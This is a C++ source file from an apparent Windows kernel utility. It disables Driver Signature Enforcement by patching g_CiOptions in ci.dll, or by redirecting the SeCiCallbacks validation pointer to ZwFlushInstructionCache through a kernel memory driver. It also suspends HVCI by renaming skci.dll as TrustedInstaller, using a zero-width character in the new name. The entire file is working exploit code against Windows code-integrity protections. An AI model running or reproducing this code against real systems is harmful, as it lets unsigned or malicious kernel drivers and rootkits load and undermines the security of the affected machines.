// DSEBypass.cpp
// Unified DSE Bypass Manager - combines Standard and Safe (PDB-based) methods
// Standard: g_CiOptions modification + HVCI bypass via skci.dll rename
// Safe: PDB-based SeCiCallbacks patching (preserves VBS functionality)

#include "DSEBypass.h"
#include "TrustedInstallerIntegrator.h"
#include "common.h"
#include <psapi.h>
#include <shlwapi.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "shlwapi.lib")

// ============================================================================
// CONSTANTS
// ============================================================================

static constexpr DWORD64 CALLBACK_OFFSET = 0x20;  // SeCiCallbacks callback offset

// ============================================================================
// KERNEL MODULE STRUCTURES
// ============================================================================

typedef struct _SYSTEM_MODULE {
    ULONG_PTR Reserved1;
    ULONG_PTR Reserved2;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT PathLength;
    CHAR ImageName[256];
} SYSTEM_MODULE, *PSYSTEM_MODULE;

typedef struct _SYSTEM_MODULE_INFORMATION {
    ULONG Count;
    SYSTEM_MODULE Modules[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

// ============================================================================
// CONSTRUCTION
// ============================================================================

DSEBypass::DSEBypass(std::unique_ptr<kvc>& driver, TrustedInstallerIntegrator* ti)
    : m_driver(driver)
    , m_trustedInstaller(ti)
{
    DEBUG(L"DSEBypass initialized (unified manager)");
}

// ============================================================================
// PUBLIC INTERFACE - METHOD DISPATCH
// ============================================================================

bool DSEBypass::Disable(Method method) noexcept {
    switch (method) {
        case Method::Standard:
            return DisableStandard();
        case Method::Safe:
            return DisableSafe();
        default:
            ERROR(L"Unknown DSE bypass method");
            return false;
    }
}

bool DSEBypass::Restore(Method method) noexcept {
    switch (method) {
        case Method::Standard:
            return RestoreStandard();
        case Method::Safe:
            return RestoreSafe();
        default:
            ERROR(L"Unknown DSE restore method");
            return false;
    }
}

// ============================================================================
// STATUS AND DIAGNOSTICS
// ============================================================================

bool DSEBypass::GetStatus(Status& outStatus) noexcept {
    // Find ci.dll kernel module
    auto ciBase = GetKernelModuleBase("ci.dll");
    if (!ciBase) {
        ERROR(L"Failed to locate ci.dll");
        return false;
    }
    
    // Locate g_CiOptions
    ULONG_PTR ciOptionsAddr = FindCiOptions(ciBase.value());
    if (!ciOptionsAddr) {
        ERROR(L"Failed to locate g_CiOptions");
        return false;
    }
    
    // Read current value
    auto current = m_driver->Read32(ciOptionsAddr);
    if (!current) {
        ERROR(L"Failed to read g_CiOptions");
        return false;
    }
    
    DWORD value = current.value();
    
    // Fill status structure
    outStatus.CiOptionsAddress = ciOptionsAddr;
    outStatus.CiOptionsValue = value;
    outStatus.DSEEnabled = (value & 0x6) != 0;
    outStatus.HVCIEnabled = IsHVCIEnabled(value);
    outStatus.SavedCallback = SessionManager::GetOriginalCiCallback();
    
    // Cache for later use
    m_ciOptionsAddr = ciOptionsAddr;
    m_originalCiOptions = value;
    
    return true;
}

DSEBypass::DSEState DSEBypass::CheckSafeMethodState() noexcept {
    // Get current kernel info
    auto kernelInfo = GetKernelInfo();
    if (!kernelInfo) {
        return DSEState::UNKNOWN;
    }
    
    auto [kernelBase, kernelPath] = *kernelInfo;
    
    // Get offsets from PDB
    auto offsets = m_symbolEngine.GetSymbolOffsets(kernelPath);
    if (!offsets) {
        return DSEState::UNKNOWN;
    }
    
    auto [offSeCi, offZwFlush] = *offsets;
    
    DWORD64 targetAddress = kernelBase + offSeCi + CALLBACK_OFFSET;
    DWORD64 safeFunction = kernelBase + offZwFlush;
    
    auto current = m_driver->Read64(targetAddress);
    if (!current) {
        return DSEState::UNKNOWN;
    }
    
    if (*current == safeFunction) {
        return DSEState::PATCHED;
    }
    
    auto original = SessionManager::GetOriginalCiCallback();
    if (original != 0 && *current == original) {
        return DSEState::NORMAL;
    }
    
    // Value is neither safe function nor saved original
    return DSEState::CORRUPTED;
}

std::wstring DSEBypass::GetDSEStateString(DSEState state) {
    switch (state) {
        case DSEState::NORMAL:    return L"NORMAL (DSE enabled)";
        case DSEState::PATCHED:   return L"PATCHED (DSE disabled)";
        case DSEState::CORRUPTED: return L"CORRUPTED (unknown callback)";
        default:                  return L"UNKNOWN (no data)";
    }
}

// ============================================================================
// STANDARD METHOD - g_CiOptions PATCHING
// ============================================================================

bool DSEBypass::DisableStandard() noexcept {
    DEBUG(L"Attempting to disable DSE using Standard method...");
    
    // Find ci.dll kernel module base address
    auto ciBase = GetKernelModuleBase("ci.dll");
    if (!ciBase) {
        ERROR(L"Failed to locate ci.dll");
        return false;
    }
    
    DEBUG(L"ci.dll base: 0x%llX", ciBase.value());
    
    // Locate g_CiOptions variable in CiPolicy section
    m_ciOptionsAddr = FindCiOptions(ciBase.value());
    if (!m_ciOptionsAddr) {
        ERROR(L"Failed to locate g_CiOptions");
        return false;
    }
    
    DEBUG(L"g_CiOptions address: 0x%llX", m_ciOptionsAddr);
    
    // Read current DSE value from kernel memory
    auto current = m_driver->Read32(m_ciOptionsAddr);
    if (!current) {
        ERROR(L"Failed to read g_CiOptions");
        return false;
    }
    
    DWORD currentValue = current.value();
    m_originalCiOptions = currentValue;
    DEBUG(L"Current g_CiOptions: 0x%08X", currentValue);
    
    // Check if DSE is already disabled
    if (currentValue == 0x00000000) {
        INFO(L"DSE already disabled - no action required");
        SUCCESS(L"Kernel accepts unsigned drivers");
        return true;
    }

    // Standard method only works with 0x00000006 (no HVCI)
    // HVCI handling is done in Controller before calling this
    if (currentValue != 0x00000006) {
        INFO(L"g_CiOptions value: 0x%08X - direct patching not supported", currentValue);
        INFO(L"Use modern method: 'kvc dse off --safe'");
        INFO(L"Or use legacy HVCI bypass: 'kvc dse off' with 0x0001C006 flag");
        return true;
    }
    
    // Disable DSE by clearing bits 1 and 2
    DWORD newValue = 0x00000000;
    
    if (!m_driver->Write32(m_ciOptionsAddr, newValue)) {
        ERROR(L"Failed to write g_CiOptions");
        return false;
    }
    
    // Verify the modification was successful
    auto verify = m_driver->Read32(m_ciOptionsAddr);
    if (!verify || verify.value() != newValue) {
        ERROR(L"Verification failed (expected: 0x%08X, got: 0x%08X)", 
              newValue, verify ? verify.value() : 0xFFFFFFFF);
        return false;
    }
    
    SUCCESS(L"Driver signature enforcement is off");
    INFO(L"No restart required - unsigned drivers can now be loaded");
    return true;
}

bool DSEBypass::RestoreStandard() noexcept {
    DEBUG(L"Attempting to restore DSE using Standard method...");
    
    // Find ci.dll base address
    auto ciBase = GetKernelModuleBase("ci.dll");
    if (!ciBase) {
        ERROR(L"Failed to locate ci.dll");
        return false;
    }
    
    // Locate g_CiOptions
    m_ciOptionsAddr = FindCiOptions(ciBase.value());
    if (!m_ciOptionsAddr) {
        ERROR(L"Failed to locate g_CiOptions");
        return false;
    }
    
    DEBUG(L"g_CiOptions address: 0x%llX", m_ciOptionsAddr);
    
    // Read current value
    auto current = m_driver->Read32(m_ciOptionsAddr);
    if (!current) {
        ERROR(L"Failed to read g_CiOptions");
        return false;
    }
    
    DWORD currentValue = current.value();
    DEBUG(L"Current g_CiOptions: 0x%08X", currentValue);
    
    // Check if DSE is already enabled (bits 1 and 2 set)
    bool dseEnabled = (currentValue & 0x6) != 0;
    if (dseEnabled) {
        INFO(L"DSE already enabled (g_CiOptions = 0x%08X) - no action required", currentValue);
        SUCCESS(L"Driver signature enforcement is active");
        return true;
    }
    
    // Verify DSE is disabled (0x00000000) before restoring
    if (currentValue != 0x00000000) {
        INFO(L"DSE restore failed: g_CiOptions = 0x%08X (expected: 0x00000000)", currentValue);
        INFO(L"DSE may already be enabled or system in unexpected state");
        INFO(L"Use 'kvc dse' to check current protection status");
        return false;
    }
    
    // Restore DSE bits
    DWORD newValue = 0x00000006;
    
    if (!m_driver->Write32(m_ciOptionsAddr, newValue)) {
        ERROR(L"Failed to write g_CiOptions");
        return false;
    }
    
    // Verify the change
    auto verify = m_driver->Read32(m_ciOptionsAddr);
    if (!verify || verify.value() != newValue) {
        ERROR(L"Verification failed (expected: 0x%08X, got: 0x%08X)", 
              newValue, verify ? verify.value() : 0xFFFFFFFF);
        return false;
    }
    
    SUCCESS(L"Driver signature enforcement is on (0x%08X -> 0x%08X)", currentValue, newValue);
    INFO(L"Kernel protection reactivated - no restart required");
    return true;
}

// ============================================================================
// STANDARD METHOD - HVCI BYPASS (skci.dll manipulation)
// ============================================================================

bool DSEBypass::RenameSkciLibrary() noexcept {
    DEBUG(L"Attempting to rename skci.dll to disable hypervisor");
    
    if (!m_trustedInstaller) {
        ERROR(L"TrustedInstaller not available");
        return false;
    }
    
    wchar_t sysDir[MAX_PATH];
    if (GetSystemDirectoryW(sysDir, MAX_PATH) == 0) {
        ERROR(L"Failed to get System32 directory");
        return false;
    }
    
    std::wstring srcPath = std::wstring(sysDir) + L"\\skci.dll";
    std::wstring dstPath = std::wstring(sysDir) + L"\\skci\u200B.dll";
    
    DEBUG(L"Rename: %s -> %s", srcPath.c_str(), dstPath.c_str());
    
    if (!m_trustedInstaller->RenameFileAsTrustedInstaller(srcPath, dstPath)) {
        ERROR(L"Failed to rename skci.dll (TrustedInstaller operation failed)");
        return false;
    }
    
    SUCCESS(L"Windows hypervisor services temporarily suspended");
    return true;
}

bool DSEBypass::RestoreSkciLibrary() noexcept {
    DEBUG(L"Restoring skci.dll");
    
    if (!m_trustedInstaller) {
        ERROR(L"TrustedInstaller not available");
        return false;
    }
    
    wchar_t sysDir[MAX_PATH];
    if (GetSystemDirectoryW(sysDir, MAX_PATH) == 0) {
        ERROR(L"Failed to get System32 directory");
        return false;
    }
    
    std::wstring srcPath = std::wstring(sysDir) + L"\\skci\u200B.dll";
    std::wstring dstPath = std::wstring(sysDir) + L"\\skci.dll";
    
    if (!m_trustedInstaller->RenameFileAsTrustedInstaller(srcPath, dstPath)) {
        DWORD error = GetLastError();
        ERROR(L"Failed to restore skci.dll (error: %d)", error);
        return false;
    }
    
    SUCCESS(L"skci.dll restored successfully");
    return true;
}

bool DSEBypass::CreatePendingFileRename() noexcept {
    DEBUG(L"Creating PendingFileRenameOperations for skci.dll restore");

    wchar_t sysDir[MAX_PATH];
    if (GetSystemDirectoryW(sysDir, MAX_PATH) == 0) {
        ERROR(L"Failed to get System32 directory");
        return false;
    }

    std::wstring srcPath = std::wstring(L"\\??\\") + sysDir + L"\\skci\u200B.dll";
    std::wstring dstPath = std::wstring(L"\\??\\") + sysDir + L"\\skci.dll";

    // Prepare Multi-String array (source, destination, empty terminator)
    std::vector<wchar_t> multiString;
    multiString.insert(multiString.end(), srcPath.begin(), srcPath.end());
    multiString.push_back(L'\0');
    multiString.insert(multiString.end(), dstPath.begin(), dstPath.end());
    multiString.push_back(L'\0');
    multiString.push_back(L'\0'); // REG_MULTI_SZ terminator

    RegKeyGuard key;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                      L"SYSTEM\\CurrentControlSet\\Control\\Session Manager",
                      0, KEY_WRITE, key.addressof()) != ERROR_SUCCESS) {
        ERROR(L"Failed to open Session Manager key");
        return false;
    }

    // Set PendingFileRenameOperations
    LONG result = RegSetValueExW(key.get(), L"PendingFileRenameOperations", 0, REG_MULTI_SZ,
                                 reinterpret_cast<const BYTE*>(multiString.data()),
                                 static_cast<DWORD>(multiString.size() * sizeof(wchar_t)));

    if (result != ERROR_SUCCESS) {
        ERROR(L"Failed to set PendingFileRenameOperations (error: %d)", result);
        return false;
    }

    // Set AllowProtectedRenames flag
    DWORD allowFlag = 1;
    result = RegSetValueExW(key.get(), L"AllowProtectedRenames", 0, REG_DWORD,
                            reinterpret_cast<const BYTE*>(&allowFlag), sizeof(DWORD));

    if (result != ERROR_SUCCESS) {
        ERROR(L"Failed to set AllowProtectedRenames (error: %d)", result);
        return false;
    }

    DEBUG(L"PendingFileRenameOperations configured: %s -> %s", srcPath.c_str(), dstPath.c_str());
    SUCCESS(L"File restore will be performed automatically by Windows on next boot");
    return true;
}

// ============================================================================
// SAFE METHOD - SeCiCallbacks PATCHING (PDB-based)
// ============================================================================

bool DSEBypass::DisableSafe() noexcept {
    INFO(L"Starting Safe DSE Bypass (SeCiCallbacks method)...");
    
    // Get current LCUVersion for logging only
    std::wstring currentLCUVer = GetCurrentLCUVersion();
    if (!currentLCUVer.empty()) {
        INFO(L"Current LCUVersion: %s", currentLCUVer.c_str());
    }
    
    // Get current kernel base (changes every reboot due to KASLR)
    auto kernelInfo = GetKernelInfo();
    if (!kernelInfo) {
        ERROR(L"Failed to get kernel information");
        return false;
    }
    
    auto [kernelBase, kernelPath] = *kernelInfo;
    INFO(L"Current Kernel Base: 0x%llX", kernelBase);
    
    // Get symbol offsets from local PDB or download
    INFO(L"Resolving symbols from PDB...");
    auto offsets = m_symbolEngine.GetSymbolOffsets(kernelPath);
    if (!offsets) {
        ERROR(L"Failed to get symbol offsets");
        return false;
    }
    
    auto [offSeCi, offZwFlush] = *offsets;
    
    // Validate offsets
    if (!ValidateOffsets(offSeCi, offZwFlush, kernelBase)) {
        ERROR(L"Offset validation failed");
        return false;
    }
    
    // Calculate addresses using current kernel base
    DWORD64 seciBase = kernelBase + offSeCi;
    DWORD64 targetAddress = seciBase + CALLBACK_OFFSET;
    DWORD64 safeFunction = kernelBase + offZwFlush;
    
    DEBUG(L"Kernel base: 0x%llX", kernelBase);
    DEBUG(L"SeCi offset: 0x%llX", offSeCi);
    DEBUG(L"ZwFlush offset: 0x%llX", offZwFlush);
    DEBUG(L"SeCiCallbacks base: 0x%llX", seciBase);
    DEBUG(L"Target address: 0x%llX", targetAddress);
    DEBUG(L"Safe function: 0x%llX", safeFunction);
    
    // Read current callback value
    auto current = m_driver->Read64(targetAddress);
    if (!current) {
        ERROR(L"Failed to read current kernel callback at 0x%llX", targetAddress);
        ERROR(L"Possible causes: Invalid address, driver not loaded, or memory protected");
        return false;
    }
    
    DEBUG(L"Current callback value: 0x%llX", *current);
    
    // Check if already patched
    if (*current == safeFunction) {
        // Already patched - check if we have original saved
        auto savedOriginal = SessionManager::GetOriginalCiCallback();
        if (savedOriginal == 0) {
            // Save the current value (which is the patched value)
            SessionManager::SaveOriginalCiCallback(*current);
            DEBUG(L"Saved current callback (already patched): 0x%llX", *current);
        }
        
        SUCCESS(L"DSE is already disabled (Safe Mode)");
        SUCCESS(L"State: PATCHED (ZwFlush callback active)");
        return true;
    }
    
    // Validate kernel function pointer range
    if (*current < 0xFFFFF80000000000ULL) {
        ERROR(L"Current value doesn't appear to be a valid kernel function address");
        ERROR(L"Value: 0x%llX (expected >= 0xFFFFF80000000000)", *current);
        ERROR(L"Target address calculation may be incorrect");
        return false;
    }
    
    // Check if this matches a previously saved original
    auto savedOriginal = SessionManager::GetOriginalCiCallback();
    if (savedOriginal != 0 && *current == savedOriginal) {
        INFO(L"Current callback matches saved original");
        INFO(L"State: NORMAL (DSE enabled)");
        INFO(L"Proceeding with patch...");
    }
    
    // Save original callback before patching
    SessionManager::SaveOriginalCiCallback(*current);
    DEBUG(L"Saved original callback: 0x%llX", *current);
    
    // Apply patch
    return ApplyCallbackPatch(targetAddress, safeFunction, *current);
}

bool DSEBypass::RestoreSafe() noexcept {
    INFO(L"Restoring DSE configuration (Safe method)...");
    
    // Get current LCUVersion for logging
    std::wstring currentLCUVer = GetCurrentLCUVersion();
    if (!currentLCUVer.empty()) {
        INFO(L"Current LCUVersion: %s", currentLCUVer.c_str());
    }
    
    // Get current kernel base (changes every reboot due to KASLR)
    auto kernelInfo = GetKernelInfo();
    if (!kernelInfo) {
        ERROR(L"Failed to get kernel information");
        return false;
    }
    
    auto [kernelBase, kernelPath] = *kernelInfo;
    INFO(L"Current Kernel Base: 0x%llX", kernelBase);
    
    // Get symbol offsets
    INFO(L"Resolving symbols from PDB...");
    auto offsets = m_symbolEngine.GetSymbolOffsets(kernelPath);
    if (!offsets) {
        ERROR(L"Failed to get symbol offsets");
        return false;
    }
    
    auto [offSeCi, offZwFlush] = *offsets;
    
    // Calculate addresses
    DWORD64 targetAddress = kernelBase + offSeCi + CALLBACK_OFFSET;
    DWORD64 safeFunction = kernelBase + offZwFlush;
    
    // Check current state in kernel
    auto current = m_driver->Read64(targetAddress);
    if (!current) {
        ERROR(L"Failed to read kernel callback at 0x%llX", targetAddress);
        return false;
    }
    
    DEBUG(L"Current value at 0x%llX: 0x%llX", targetAddress, *current);
    DEBUG(L"Safe function (ZwFlush): 0x%llX", safeFunction);
    
    // Check if already patched (DSE disabled)
    if (*current == safeFunction) {
        // DSE is disabled - check if we have original callback
        auto original = SessionManager::GetOriginalCiCallback();
        if (original == 0) {
            ERROR(L"DSE is DISABLED (patched)");
            ERROR(L"No original callback saved - cannot restore");
            ERROR(L"State: PATCHED (restoration impossible)");
            return false;
        } else {
            INFO(L"DSE is DISABLED (patched)");
            INFO(L"Original callback available: 0x%llX", original);
            INFO(L"Proceeding with restoration...");
            // Continue to restoration below
        }
    }
    
    // Check if already restored (or never was patched)
    auto original = SessionManager::GetOriginalCiCallback();
    if (original != 0 && *current == original) {
        SUCCESS(L"DSE is already RESTORED");
        SUCCESS(L"Current callback matches saved original");
        SUCCESS(L"State: NORMAL (DSE enabled)");
        return true;
    }
    
    // If we don't have original and value is not safeFunction
    if (original == 0 && *current != safeFunction) {
        INFO(L"DSE appears to be in NORMAL state");
        INFO(L"No patch detected, no saved state");
        INFO(L"State: NORMAL (or unknown, no cache)");
        return true;
    }
    
    // If we don't have original and value IS safeFunction
    if (original == 0 && *current == safeFunction) {
        ERROR(L"DSE is DISABLED but no original callback saved");
        ERROR(L"State: PATCHED (cannot restore - no saved state)");
        return false;
    }
    
    // Normal restoration (have original, current != original)
    INFO(L"Current state: PATCHED");
    INFO(L"Current callback: 0x%llX (ZwFlush)", *current);
    INFO(L"Restoring to original: 0x%llX", original);
    
    if (RestoreCallbackPatch(targetAddress, original)) {
        SUCCESS(L"DSE RESTORED successfully");
        SUCCESS(L"State changed: PATCHED -> NORMAL");
        // Keep original callback in registry for future use
        DEBUG(L"Original callback kept in registry for future operations");
        return true;
    }
    
    ERROR(L"Failed to restore kernel callback");
    return false;
}

// ============================================================================
// SAFE METHOD - PATCH OPERATIONS
// ============================================================================

bool DSEBypass::ApplyCallbackPatch(DWORD64 targetAddress, DWORD64 safeFunction, DWORD64 originalCallback) noexcept {
    INFO(L"Patching CiValidateImageHeader callback");
    INFO(L"SeCiCallbacks base: 0x%llX", targetAddress - CALLBACK_OFFSET);
    INFO(L"Callback offset: +0x%llX", CALLBACK_OFFSET);
    INFO(L"Target address: 0x%llX", targetAddress);
    INFO(L"Original: 0x%llX", originalCallback);
    INFO(L"Patch to: 0x%llX (ZwFlushInstructionCache)", safeFunction);
    
    // Apply the patch
    if (m_driver->Write64(targetAddress, safeFunction)) {
        // Verify the patch
        auto verify = m_driver->Read64(targetAddress);
        if (verify && *verify == safeFunction) {
            SUCCESS(L"DSE disabled successfully via SeCiCallbacks");
            SUCCESS(L"Kernel callback redirected to ZwFlushInstructionCache");
            SUCCESS(L"State: NORMAL -> PATCHED");
            return true;
        } else {
            ERROR(L"Patch verification failed");
            // Try to restore original
            m_driver->Write64(targetAddress, originalCallback);
            return false;
        }
    }
    
    ERROR(L"Failed to write to kernel memory");
    return false;
}

bool DSEBypass::RestoreCallbackPatch(DWORD64 targetAddress, DWORD64 originalCallback) noexcept {
    INFO(L"Restoring original kernel callback...");
    INFO(L"Target: 0x%llX", targetAddress);
    INFO(L"Restore value: 0x%llX", originalCallback);
    
    // Restore original
    if (m_driver->Write64(targetAddress, originalCallback)) {
        // Verify restoration
        auto verify = m_driver->Read64(targetAddress);
        if (verify && *verify == originalCallback) {
            SUCCESS(L"Kernel callback restored successfully");
            return true;
        } else {
            ERROR(L"Restoration verification failed");
            return false;
        }
    }
    
    ERROR(L"Failed to restore kernel callback");
    return false;
}

bool DSEBypass::ValidateOffsets(DWORD64 offSeCi, DWORD64 offZwFlush, DWORD64 kernelBase) noexcept {
    if (offSeCi == 0 || offZwFlush == 0) {
        ERROR(L"Invalid offsets (zero)");
        return false;
    }
    if (offSeCi > 0xFFFFFF || offZwFlush > 0xFFFFFF) {
        ERROR(L"Suspiciously large offsets");
        return false;
    }
    if (offSeCi >= offZwFlush) {
        INFO(L"SeCiCallbacks offset >= ZwFlush offset (unusual)");
    }
    
    DEBUG(L"Offsets validated: SeCi=0x%llX, ZwFlush=0x%llX", offSeCi, offZwFlush);
    return true;
}

// ============================================================================
// SAFE METHOD - KERNEL INFORMATION
// ============================================================================

std::optional<std::pair<DWORD64, std::wstring>> DSEBypass::GetKernelInfo() noexcept {
    LPVOID drivers[1024];
    DWORD needed;
    
    if (!EnumDeviceDrivers(drivers, sizeof(drivers), &needed)) {
        ERROR(L"Failed to enumerate device drivers: %d", GetLastError());
        return std::nullopt;
    }
    
    DWORD64 kernelBase = reinterpret_cast<DWORD64>(drivers[0]);
    
    wchar_t kernelPath[MAX_PATH];
    if (!GetDeviceDriverFileNameW(drivers[0], kernelPath, MAX_PATH)) {
        ERROR(L"Failed to get kernel path: %d", GetLastError());
        return std::nullopt;
    }
    
    // Convert NT path to DOS path
    std::wstring ntPath = kernelPath;
    std::wstring dosPath;
    
    if (ntPath.find(L"\\SystemRoot\\") == 0) {
        wchar_t winDir[MAX_PATH];
        GetWindowsDirectoryW(winDir, MAX_PATH);
        dosPath = std::wstring(winDir) + ntPath.substr(11);
    } else if (ntPath.find(L"\\??\\") == 0) {
        dosPath = ntPath.substr(4);
    } else {
        dosPath = ntPath;
    }
    
    DEBUG(L"Kernel base: 0x%llX, path: %s", kernelBase, dosPath.c_str());
    return std::make_pair(kernelBase, dosPath);
}

std::wstring DSEBypass::GetCurrentLCUVersion() noexcept {
    std::wstring lcuVer;

    RegKeyGuard key;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                      L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
                      0, KEY_READ | KEY_WOW64_64KEY, key.addressof()) == ERROR_SUCCESS) {
        wchar_t buffer[256] = {0};
        DWORD size = sizeof(buffer);
        DWORD type = 0;

        if (RegQueryValueExW(key.get(), L"LCUVer", nullptr, &type,
            reinterpret_cast<BYTE*>(buffer), &size) == ERROR_SUCCESS &&
            type == REG_SZ) {
            lcuVer = buffer;
        } else {
            DEBUG(L"LCUVer not found in registry");
        }
    }

    return lcuVer;
}

// ============================================================================
// KERNEL MODULE HELPERS (shared by both methods)
// ============================================================================

std::optional<ULONG_PTR> DSEBypass::GetKernelModuleBase(const char* moduleName) noexcept {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) {
        ERROR(L"Failed to get ntdll.dll handle");
        return std::nullopt;
    }

    typedef NTSTATUS (WINAPI *NTQUERYSYSTEMINFORMATION)(
        ULONG SystemInformationClass,
        PVOID SystemInformation,
        ULONG SystemInformationLength,
        PULONG ReturnLength
    );

    auto pNtQuerySystemInformation = reinterpret_cast<NTQUERYSYSTEMINFORMATION>(
        GetProcAddress(hNtdll, "NtQuerySystemInformation"));
    
    if (!pNtQuerySystemInformation) {
        ERROR(L"Failed to get NtQuerySystemInformation");
        return std::nullopt;
    }

    // First call to get required buffer size
    ULONG bufferSize = 0;
    NTSTATUS status = pNtQuerySystemInformation(
        11, // SystemModuleInformation
        nullptr, 
        0, 
        &bufferSize
    );

    if (status != 0xC0000004L) { // STATUS_INFO_LENGTH_MISMATCH
        ERROR(L"NtQuerySystemInformation failed with status: 0x%08X", status);
        return std::nullopt;
    }

    // Allocate buffer and get module list
    auto buffer = std::make_unique<BYTE[]>(bufferSize);
    auto modules = reinterpret_cast<PSYSTEM_MODULE_INFORMATION>(buffer.get());
    
    status = pNtQuerySystemInformation(
        11, // SystemModuleInformation
        modules,
        bufferSize,
        &bufferSize
    );

    if (status != 0) {
        ERROR(L"NtQuerySystemInformation failed (2nd call): 0x%08X", status);
        return std::nullopt;
    }

    // Search for target module by name
    for (ULONG i = 0; i < modules->Count; i++) {
        auto& mod = modules->Modules[i];
        
        // Extract filename from full path
        const char* fileName = strrchr(mod.ImageName, '\\');
        if (fileName) {
            fileName++; // Skip backslash
        } else {
            fileName = mod.ImageName;
        }
        
        if (_stricmp(fileName, moduleName) == 0) {
            ULONG_PTR baseAddr = reinterpret_cast<ULONG_PTR>(mod.ImageBase);
            
            if (baseAddr == 0) {
                ERROR(L"Module %S found but ImageBase is NULL", moduleName);
                continue;
            }
            
            DEBUG(L"Found %S at 0x%llX (size: 0x%X)", moduleName, baseAddr, mod.ImageSize);
            return baseAddr;
        }
    }
    
    ERROR(L"Module %S not found in kernel", moduleName);
    return std::nullopt;
}

ULONG_PTR DSEBypass::FindCiOptions(ULONG_PTR ciBase) noexcept {
    DEBUG(L"Searching for g_CiOptions in ci.dll at base 0x%llX", ciBase);
    
    // Get CiPolicy section information
    auto dataSection = GetDataSection(ciBase);
    if (!dataSection) {
        ERROR(L"Failed to locate CiPolicy section in ci.dll");
        return 0;
    }
    
    ULONG_PTR dataStart = dataSection->first;
    SIZE_T dataSize = dataSection->second;
    
    DEBUG(L"CiPolicy section: 0x%llX (size: 0x%llX)", dataStart, dataSize);
    
    // g_CiOptions is always at offset +4 in CiPolicy section
    ULONG_PTR ciOptionsAddr = dataStart + 0x4;
    
    // Verify we can read from this address
    auto currentValue = m_driver->Read32(ciOptionsAddr);
    if (!currentValue) {
        ERROR(L"Failed to read g_CiOptions at 0x%llX", ciOptionsAddr);
        return 0;
    }
    
    DEBUG(L"Found g_CiOptions at: 0x%llX (value: 0x%08X)", ciOptionsAddr, currentValue.value());
    return ciOptionsAddr;
}

std::optional<std::pair<ULONG_PTR, SIZE_T>> DSEBypass::GetDataSection(ULONG_PTR moduleBase) noexcept {
    // Read DOS header (MZ signature)
    auto dosHeader = m_driver->Read16(moduleBase);
    if (!dosHeader || dosHeader.value() != 0x5A4D) {
        return std::nullopt;
    }
    
    // Get PE header offset
    auto e_lfanew = m_driver->Read32(moduleBase + 0x3C);
    if (!e_lfanew || e_lfanew.value() > 0x1000) {
        return std::nullopt;
    }
    
    ULONG_PTR ntHeaders = moduleBase + e_lfanew.value();
    
    // Verify PE signature
    auto peSignature = m_driver->Read32(ntHeaders);
    if (!peSignature || peSignature.value() != 0x4550) {
        return std::nullopt;
    }
    
    // Get section count
    auto numSections = m_driver->Read16(ntHeaders + 0x6);
    if (!numSections || numSections.value() > 50) {
        return std::nullopt;
    }
    
    auto sizeOfOptionalHeader = m_driver->Read16(ntHeaders + 0x14);
    if (!sizeOfOptionalHeader) return std::nullopt;
    
    ULONG_PTR firstSection = ntHeaders + 4 + 20 + sizeOfOptionalHeader.value();
    
    DEBUG(L"Scanning %d sections for CiPolicy...", numSections.value());
    
    // Search for CiPolicy section
    for (WORD i = 0; i < numSections.value(); i++) {
        ULONG_PTR sectionHeader = firstSection + (i * 40);
        
        // Read section name (8 bytes)
        char name[9] = {0};
        for (int j = 0; j < 8; j++) {
            auto ch = m_driver->Read8(sectionHeader + j);
            if (ch) name[j] = static_cast<char>(ch.value());
        }
        
        // Check if this is CiPolicy
        if (strcmp(name, "CiPolicy") == 0) {
            auto virtualSize = m_driver->Read32(sectionHeader + 0x08);
            auto virtualAddr = m_driver->Read32(sectionHeader + 0x0C);
            
            if (virtualSize && virtualAddr) {
                DEBUG(L"Found CiPolicy section at RVA 0x%06X, size 0x%06X", 
                     virtualAddr.value(), virtualSize.value());
                
                return std::make_pair(
                    moduleBase + virtualAddr.value(),
                    static_cast<SIZE_T>(virtualSize.value())
                );
            }
        }
    }
    
    ERROR(L"CiPolicy section not found in ci.dll");
    return std::nullopt;
}
